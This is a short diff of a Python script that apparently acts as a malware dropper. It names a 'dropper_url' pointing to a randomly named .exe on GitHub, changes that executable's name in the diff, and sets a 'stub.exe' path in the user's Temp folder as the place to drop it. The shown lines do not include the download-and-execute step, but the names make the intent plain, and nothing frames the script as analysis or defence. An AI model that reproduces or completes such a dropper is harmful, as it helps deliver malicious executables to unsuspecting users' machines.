@@ -1,6 +1,6 @@
 import os, requests
 
-dropper_url = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/irjgjrngerjgejngjergjegeg.exe"
+dropper_url = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/qsdqsdqsdazdasdqsd.exe"
 temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
 dropped_path = os.path.join(temp_dir, "stub.exe")
 
